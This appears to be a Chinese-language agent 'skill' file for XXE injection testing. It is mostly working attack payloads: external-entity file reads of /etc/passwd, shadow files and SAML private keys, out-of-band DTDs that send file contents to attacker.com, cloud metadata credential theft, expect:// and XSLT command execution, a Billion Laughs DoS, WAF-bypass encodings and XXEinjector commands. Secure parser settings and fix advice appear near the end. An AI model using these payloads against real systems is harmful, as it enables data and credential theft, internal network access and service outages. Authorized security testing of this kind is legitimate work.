---
name: xxe-injection-testing
description: XXE XML外部实体注入深度测试技能：全解析器攻击面、文件读取/SSRF/RCE/DoS利用链、编码绕过、OOB外带、Java/.NET/PHP特定利用
version: 2.0.0
---

# XXE XML外部实体注入深度测试技能

## 概述

XXE（XML External Entity Injection）利用XML解析器对外部实体的不安全处理，实现文件读取、SSRF、端口扫描、RCE（特定场景）、DoS等攻击。现代防护包括禁用外部实体、使用安全解析器配置、WAF检测ENTITY/SYSTEM关键字。本技能覆盖全解析器（libxml2/.NET/Java/JAXB/SAP/PHP SimpleXML）、全协议利用、编码绕过、OOB外带、XInclude攻击、参数实体高级技巧。

## 一、XXE完整攻击面

### 1.1 XML输入点
| 输入点 | 格式 |
|--------|------|
| 请求体Content-Type: application/xml | 标准XML POST |
| 请求体Content-Type: text/xml | SOAP/XML-RPC |
| SOAP接口 | SOAP Action + XML |
| SAML单点登录 | SAML Request/Response |
| SVG文件上传 | SVG含XML |
| DOCX/XLSX/PPTX | OOXML压缩包内XML |
| PDF（FDF/XFDF）| FDF表单XML |
| RSS/Atom订阅 | XML格式订阅 |
| XML配置导入导出 | Spring/Struts配置文件 |
| XML-RPC接口 | WordPress/MovableType |
| REST API（接受XML）| JSON换成XML |
| Web Service | WSDL/SOAP |
| Android应用XML | AndroidManifest/Binary XML |
| Office Open XML | docx/xlsx/pptx内rels |
| XMPP/Jabber消息 | XML协议消息 |
| XHTML/HTML5 XML模式 | XHTML |

### 1.2 解析器与默认外部实体支持
| 解析器/库 | 默认外部实体 | XXE风险 |
|----------|------------|---------|
| libxml2（PHP） | PHP < 8.0默认禁用 | 低（需手动开启）|
| Java DOM/SAX/StAX | 默认启用，无FEATURE_SECURE_PROCESSING | **高** |
| Java SAXParserFactory | 默认启用，除非setFeature关闭 | **高** |
| Java XMLReader | 默认启用 | **高** |
| Java DocumentBuilderFactory | 默认启用 | **高** |
| .NET XmlDocument | 默认禁用prohibitDTD=false时启用 | 中（需配置）|
| .NET XmlTextReader（老） | 默认ProhibitDtd=false | 中 |
| Python lxml | 默认resolve_entities=True | **高** |
| Python xml.sax | 默认外部实体启用 | **高** |
| Python xml.etree.ElementTree | 默认不处理外部实体 | 低 |
| Ruby REXML | 默认entity_expansion_limit | 中 |
| Ruby Nokogiri | 默认不加载外部实体 | 低 |
| SAP/NetWeaver | 默认启用 | **高（历史多个CVE）** |
| Oracle XML DB | 默认启用 | 高 |

### 1.3 XXE危害类型
```
1. 任意文件读取（file://协议 + 本地文件）
2. SSRF（http:///https:///ftp://等任意TCP协议）
3. 内网端口扫描（http://127.0.0.1:port）
4. DoS（Billion Laughs/YAML Bomb/递归实体）
5. RCE（特定场景：PHP expect://、Java XSLT、.NET IsolatedStorage）
6. 云元数据访问（与SSRF类似）
7. 认证绕过（SAML XXE绕过）
8. 敏感信息泄露（配置文件/密钥/数据库密码）
```

## 二、基础检测Payload

### 2.1 最小检测Payload
```xml
<!-- 回显检测：DNS/HTTP外带+响应回显 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe_test">
]>
<root>&xxe;</root>
```

### 2.2 文件读取（有回显）
```xml
<!-- 基础文件读取 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### 2.3 SSRF/端口探测
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>

<!-- 探测内网服务 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### 2.4 Blind XXE（OOB外带）
无回显时通过外带通道获取数据：
```xml
<!-- OOB基础：DNS/HTTP回调，说明XXE存在 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- 外部DTD文件（attacker.com/xxe.dtd）：-->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;

<!-- 简化版（无外部DTD，部分解析器不允许参数实体引用参数实体）-->
```

## 三、协议与编码绕过

### 3.1 支持协议
| 协议 | 格式 | 用途 |
|------|------|------|
| `file:///` | file:///etc/passwd | 本地文件读取 |
| `http://` | http://host/path | SSRF/HTTP请求 |
| `https://` | https://host/path | HTTPS请求 |
| `ftp://` | ftp://host/file | FTP文件 |
| `gopher://` | gopher://host:port/_data | 任意TCP（部分解析器）|
| `dict://` | dict://host:port/command | 端口探测/命令 |
| `php://filter/` | php://filter/convert.base64-encode/resource=file | PHP文件base64读取 |
| `jar://` | jar:http://host/file.zip!/entry | Java JAR读取 |
| `netdoc:///` | netdoc:///etc/passwd | Java文件读取 |
| `expect://` | expect://id | PHP expect扩展RCE |
| `data://` | data://text/plain,xxx | 内联数据 |
| `ldap://` | ldap://host/dn | LDAP访问 |
| `tftp://` | tftp://host/file | TFTP（UDP）|

### 3.2 PHP协议Wrapper
```xml
<!-- base64编码读文件避免XML特殊字符破坏 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- rot13 -->
<!ENTITY xxe SYSTEM "php://filter/string.rot13/resource=/etc/passwd">

<!-- iconv编码转换 -->
<!ENTITY xxe SYSTEM "php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd">

<!-- zlib压缩读取 -->
<!ENTITY xxe SYSTEM "compress.zlib:///var/log/syslog">
```

### 3.3 编码绕过WAF
```xml
<!-- UTF-7编码（部分解析器支持）-->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-

<!-- UTF-16 BOM -->
<?xml version="1.0" encoding="UTF-16"?>
<!-- 将XML内容UTF-16编码 -->

<!-- 实体编码（在实体中使用）-->
<!ENTITY xxe SYSTEM "file:///etc/&#x70;asswd">

<!-- 参数实体使用十六进制/十进制字符引用 -->
<!ENTITY % file SYSTEM "file:///etc/&#x70;asswd">

<!-- XML外部DTD中引用 -->
<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://attacker.com/?c=%file;'>">
%a;
%b;

<!-- 绕过ENTITY关键字过滤：使用参数实体拼接 -->
<!ENTITY % p1 "<!EN">
<!ENTITY % p2 "TITY xxe SYSTEM 'file:///etc/passwd'>">
%p1;%p2;
```

### 3.4 WAF绕过技巧
```xml
<!-- 大小写变形 -->
<!doctype foo [
  <!entity xxe system "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- DOCTYPE中插入注释 -->
<!D<!--comment-->OCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- 额外空白符/换行 -->
<!DOCTYPE 
  foo 
  [
    <!ENTITY 
      xxe 
      SYSTEM 
      "file:///etc/passwd"
    >
  ]
>

<!-- 参数实体重新定义 -->
<!DOCTYPE foo [
  <!ENTITY % sp " ">
  <!ENTITY % dtd "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>">
  %dtd;
]>

<!-- 分块/编码POST数据 -->
Transfer-Encoding: chunked
Content-Type: text/xml
```

### 3.5 外部DTD外带技术（CDATA包装）
当文件包含XML特殊字符（`<` `&` `>`等）导致解析错误时：
```xml
<!-- 服务端payload（blind oob） -->
<?xml version="1.0"?>
<!DOCTYPE roottag [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root><![CDATA[&all;]]></root>

<!-- attacker.com/xxe.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%start;%file;%end;'>">
%all;
```

### 3.6 参数实体引用限制绕过
不同解析器对参数实体引用位置限制不同：
```xml
<!-- 单参数实体（内部DTD中，部分解析器允许） -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
  %eval;
  %exfil;
]>
<root/>
<!-- 注意：有些解析器禁止在内部DTD中引用参数实体中的参数实体 -->

<!-- 外带DTD方案（绕过内部DTD限制，最稳定） -->
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/xxe_full.dtd">
<root>&exfil;</root>

<!-- xxe_full.dtd完整文件：-->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
```

## 四、各平台特定利用

### 4.1 Java XXE
```java
// 存在漏洞的代码示例
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);    // 未禁用外部实体
```

**安全配置：**
```java
// DOM
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// SAX
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// XMLReader
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// StAX
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);

// JAXB
Unmarshaller u = jc.createUnmarshaller();
SAXSource source = new SAXSource(xmlReader, inputSource);
// 需先配置XMLReader禁用外部实体

// XSLT/XPath注入
// 利用XSLT执行Java代码
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="exec" select="rt:exec($rtobject,'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Java协议利用：**
```xml
<!-- netdoc协议（老版本Java读文件）-->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">

<!-- jar协议读取远程JAR -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/evil.xml">
```

### 4.2 .NET XXE
```csharp
// 存在漏洞
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver();
doc.Load(xml);  // 默认ProhibitDtd=true，老版本false时可XXE

// 存在漏洞的老版本
XmlTextReader reader = new XmlTextReader(stream);
reader.ProhibitDtd = false;
```

**.NET特定协议：**
```xml
<!-- file:// -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">

<!-- http:// -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">

<!-- .NET IsolatedStorage可能读取 -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">
```

### 4.3 PHP XXE
```php
// 存在漏洞的情况（PHP < 8.0默认libxml_disable_entity_loader=false）
$xml = simplexml_load_string($input);    // PHP 8.0+默认不解析外部实体
```

**PHP特定利用：**
```xml
<!-- expect:// RCE（expect扩展安装时） -->
<!ENTITY xxe SYSTEM "expect://id">

<!-- php://filter编码读文件 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">

<!-- compress.zlib:// 读压缩文件 -->
<!ENTITY xxe SYSTEM "compress.zlib:///var/log/syslog.gz">
```

### 4.4 Python XXE
```python
# 存在漏洞
from lxml import etree
tree = etree.parse(xml_file)    # 默认resolve_entities=True

# python xml.sax默认不解析外部实体，但需要测试
```

### 4.5 SAML XXE（认证绕过）
```xml
<!-- SAML Response中注入XXE读取配置/密钥 -->
<!-- 利用XXE读取SP私钥后伪造SAML断言 -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shibboleth/sp-key.pem">
]>
  ...
</samlp:Response>

<!-- SAML注释注入绕过签名验证（某些实现）-->
```

## 五、高级利用场景

### 5.1 XInclude攻击（无法DOCTYPE时）
当无法注入DOCTYPE（比如已存在DOCTYPE）或XML中注入点不允许DOCTYPE时，使用XInclude：
```xml
<!-- XInclude无需DOCTYPE，在任意元素中注入 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>

<!-- XInclude + http SSRF -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
</root>

<!-- XInclude + xpointer语法 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" xpointer="xpointer(string-range(/,'',1,1000))" parse="text"/>
</root>
```

### 5.2 SVG XSS/XXE（文件上传场景）
SVG是XML格式，可包含XXE和XSS：
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text x="10" y="100">&xxe;</text>
</svg>

<!-- SVG XSS（直接执行JS）-->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>

<!-- SVG XXE+XSS组合 -->
```

### 5.3 OOXML（Office文档）XXE
DOCX/XLSX/PPTX本质是ZIP+XML：
```
docx/xlsl结构:
[Content_Types].xml
_rels/.rels
word/document.xml       → 注入XXE读取本地文件
xl/workbook.xml
word/_rels/document.xml.rels
```
构造恶意docx，document.xml中注入XXE，然后上传到文档解析服务触发。

### 5.4 Billion Laughs（XML炸弹DoS）
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```
注意：Billion Laughs导致内存/CPU耗尽DoS，测试时谨慎使用。

### 5.5 云元数据读取
```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- GCP（需要Metadata-Flavor: Google头，部分场景无法通过XXE加header） -->
<!-- Azure（需要Metadata: true头，同上） -->
<!-- 阿里云 -->
<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/ram/security-credentials/">
```

### 5.6 SOAP Action XXE
SOAP接口默认使用XML：
```xml
POST /soap/service HTTP/1.1
Content-Type: text/xml;charset=UTF-8
SOAPAction: "getUser"

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUser><id>&xxe;</id></getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### 5.7 WAF绕过：Content-Type变换
```http
# 原始：Content-Type: application/xml
# 尝试：
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: application/xhtml+xml
Content-Type: application/rss+xml
Content-Type: application/atom+xml
Content-Type: text/xml;charset=utf-8
Content-Type: application/xml;charset=iso-8859-1
Content-Type: application/x-www-form-urlencoded (某些框架自动转换)
```

## 六、工具使用

### 6.1 辅助工具
| 工具 | 用途 |
|------|------|
| Burp Suite Pro (Active Scan) | 自动检测XXE |
| XXEinjector | 自动化XXE检测利用 |
| dtd-finder | DTD查找与外带payload生成 |
| oxml_xxe | OOXML/DOCX XXE注入工具 |
| Gopherus | 配合XXE Gopher协议 |
| Docem | XXE OOB平台 |
| Interactsh/Burp Collaborator | DNS/HTTP外带 |
| https://xxe.sh/ | 在线XXE DTD托管 |

### 6.2 XXEinjector使用
```bash
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd --oob=doc
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/shadow --oob=ftp
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=expect://id --oob=http
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=netdoc:///etc/passwd --oob=gopher
```

### 6.3 OOB外带服务器搭建
```bash
# 使用xxeserv/XXEServe (https://github.com/joernchen/xxeserve)
# 或简单Flask HTTP服务记录请求
python -m http.server 80
# nc监听DNS
nc -lvup 53
# 使用Interactsh client
interactsh-client -v
```

## 七、XXE测试清单

- [ ] 所有接收XML的接口（application/xml, text/xml, SOAP）
- [ ] 尝试将JSON请求改为XML（Content-Type: application/xml）
- [ ] 文件上传（SVG/DOCX/XLSX/PPTX/XML/PDF/FDF）
- [ ] SAML SSO接口
- [ ] RSS/ATOM订阅导入
- [ ] 基础回显XXE测试（file:///etc/passwd）
- [ ] OOB Blind XXE（外部DTD+DNS/HTTP外带）
- [ ] 所有协议（file/http/php/expect/netdoc/jar/gopher）
- [ ] XInclude注入（无法DOCTYPE时）
- [ ] 参数实体高级利用
- [ ] CDATA包装外带（特殊字符文件）
- [ ] 编码绕过（UTF-7/UTF-16/实体编码）
- [ ] WAF绕过（大小写/注释/空白/Content-Type变换）
- [ ] 内网端口扫描/SSRF
- [ ] 云元数据访问
- [ ] 错误信息外带（基于error的XXE）
- [ ] SVG文件XSS+XXE组合
- [ ] Office文档XXE
- [ ] SOAP接口XXE
- [ ] XML-RPC接口
- [ ] 各语言特定协议（php://filter, netdoc://, expect://）
- [ ] DoS（Billion Laughs，谨慎测试）

## 八、修复建议

- **禁用DTD**：`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
- **禁用外部实体**：`setFeature external-general-entities/parameter-entities = false`
- **禁用外部DTD加载**：`setFeature load-external-dtd = false`
- **禁用XInclude**：`setXIncludeAware(false)`
- **白名单输入验证**：校验XML结构和内容
- **使用JSON代替XML**：尽量使用JSON格式，减少XML使用
- **XML安全库**：使用安全的XML处理库/配置
- **更新解析器版本**：使用最新版本修复已知漏洞
- **WAF规则**：检测ENTITY/SYSTEM/PUBLIC等关键字（辅助防御）
- **最小权限**：XML解析进程以低权限运行，限制文件访问
- **网络隔离**：XML解析服务不能直接访问内网/元数据

## 注意事项

- **仅限授权测试**：XXE可读取任意文件和访问内网，必须授权
- **OOB外带更稳定**：有回显XXE不稳定，Blind OOB更通用
- **DoS测试谨慎**：Billion Laughs会导致服务崩溃，仅授权后测试
- **外部DTD依赖**：OOB XXE需要外带服务器可访问（考虑防火墙出站限制）
- **编码问题**：读取二进制文件（图片/private key）需base64编码
- **SAML XXE**：可能直接绕过认证，测试后立即报告
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
